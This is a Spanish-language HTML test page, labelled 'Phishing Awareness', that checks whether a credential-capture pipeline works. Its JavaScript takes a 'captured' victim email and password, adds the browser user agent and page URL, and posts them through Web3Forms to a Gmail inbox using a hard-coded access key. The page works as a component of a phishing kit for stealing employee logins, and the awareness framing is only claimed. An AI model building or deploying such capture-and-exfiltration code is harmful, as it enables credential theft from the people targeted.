<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Web3Forms - Phishing Awareness</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            padding: 40px;
            max-width: 600px;
            width: 100%;
        }

        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }

        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }

        input, textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            font-size: 14px;
            transition: border-color 0.3s;
        }

        input:focus, textarea:focus {
            outline: none;
            border-color: #667eea;
        }

        textarea {
            resize: vertical;
            min-height: 120px;
            font-family: inherit;
        }

        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }

        button:active {
            transform: translateY(0);
        }

        button:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        .result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 6px;
            display: none;
        }

        .result.success {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
            display: block;
        }

        .result.error {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
            display: block;
        }

        .info-box {
            background: #e7f3ff;
            border-left: 4px solid #2196F3;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }

        .info-box p {
            margin: 5px 0;
            font-size: 13px;
            color: #0d47a1;
        }

        .loading {
            display: none;
            text-align: center;
            margin-top: 10px;
        }

        .loading.active {
            display: block;
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🧪 Test de Envío de Emails</h1>
        <p class="subtitle">Verifica que el sistema de captura funciona correctamente</p>

        <div class="info-box">
            <p><strong>📧 Email destino:</strong> sofly7899@gmail.com</p>
            <p><strong>🔑 Access Key:</strong> 38e2...a69 (configurado)</p>
            <p><strong>✅ Servicio:</strong> Web3Forms + Formspree</p>
        </div>

        <form id="testForm">
            <div class="form-group">
                <label for="testEmail">Email de prueba capturado:</label>
                <input type="email" id="testEmail" placeholder="victima@empresa.com" required>
            </div>

            <div class="form-group">
                <label for="testPassword">Contraseña de prueba capturada:</label>
                <input type="text" id="testPassword" placeholder="Password123!" required>
            </div>

            <div class="form-group">
                <label for="testType">Tipo de captura:</label>
                <select id="testType" style="width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 6px;">
                    <option value="login">Login</option>
                    <option value="reset">Password Reset</option>
                </select>
            </div>

            <button type="submit">🚀 Enviar Email de Prueba</button>
        </form>

        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top: 10px; color: #666;">Enviando...</p>
        </div>

        <div class="result" id="result"></div>
    </div>

    <script>
        document.getElementById('testForm').addEventListener('submit', async (e) => {
            e.preventDefault();

            const email = document.getElementById('testEmail').value;
            const password = document.getElementById('testPassword').value;
            const type = document.getElementById('testType').value;
            const resultDiv = document.getElementById('result');
            const loadingDiv = document.getElementById('loading');
            const submitBtn = e.target.querySelector('button');

            // Resetear
            resultDiv.style.display = 'none';
            resultDiv.className = 'result';
            loadingDiv.classList.add('active');
            submitBtn.disabled = true;

            const timestamp = new Date().toLocaleString('es-ES');
            const userAgent = navigator.userAgent;
            const currentUrl = window.location.href;

            const mensaje = `
═══════════════════════════════════════════
🧪 TEST DE CAPTURA - ${type.toUpperCase()}
═══════════════════════════════════════════

📧 EMAIL CAPTURADO: ${email}
🔑 CONTRASEÑA CAPTURADA: ${password}

⏰ FECHA Y HORA: ${timestamp}
🌐 NAVEGADOR: ${userAgent}
🔗 URL: ${currentUrl}

Tipo de captura: ${type}

═══════════════════════════════════════════
✅ Este es un email de prueba del sistema
═══════════════════════════════════════════
            `;

            try {
                // Web3Forms
                console.log('📤 Enviando con Web3Forms...');
                const formData = new FormData();
                formData.append('access_key', '38e2db25-d16e-4fb3-b632-be632c018a69');
                formData.append('subject', `🧪 TEST - Captura de ${type} - ${email}`);
                formData.append('from_name', 'Sistema de Phishing Awareness (TEST)');
                formData.append('email', 'sofly7899@gmail.com');
                formData.append('message', mensaje);
                formData.append('email_capturado', email);
                formData.append('password_capturada', password);
                formData.append('tipo_captura', type);
                formData.append('fecha_hora', timestamp);

                const response = await fetch('https://api.web3forms.com/submit', {
                    method: 'POST',
                    body: formData
                });

                const data = await response.json();
                
                loadingDiv.classList.remove('active');
                submitBtn.disabled = false;

                if (data.success) {
                    resultDiv.className = 'result success';
                    resultDiv.innerHTML = `
                        <strong>✅ ¡Email enviado exitosamente!</strong><br><br>
                        <p>El email fue enviado a: <strong>sofly7899@gmail.com</strong></p>
                        <p>Revisa tu bandeja de entrada (o spam) en unos segundos.</p>
                        <br>
                        <p><strong>Datos enviados:</strong></p>
                        <p>📧 Email: ${email}</p>
                        <p>🔑 Password: ${password}</p>
                        <p>📝 Tipo: ${type}</p>
                        <p>⏰ Hora: ${timestamp}</p>
                    `;
                    console.log('✅ Respuesta Web3Forms:', data);
                } else {
                    resultDiv.className = 'result error';
                    resultDiv.innerHTML = `
                        <strong>❌ Error al enviar</strong><br><br>
                        <p>${data.message || 'Error desconocido'}</p>
                    `;
                    console.error('❌ Error Web3Forms:', data);
                }
            } catch (error) {
                loadingDiv.classList.remove('active');
                submitBtn.disabled = false;
                resultDiv.className = 'result error';
                resultDiv.innerHTML = `
                    <strong>❌ Error de conexión</strong><br><br>
                    <p>${error.message}</p>
                `;
                console.error('❌ Error:', error);
            }
        });

        // Auto-rellenar campos para testing rápido
        document.getElementById('testEmail').value = 'prueba@empresa.com';
        document.getElementById('testPassword').value = 'MiPassword123!';
    </script>
</body>
</html>
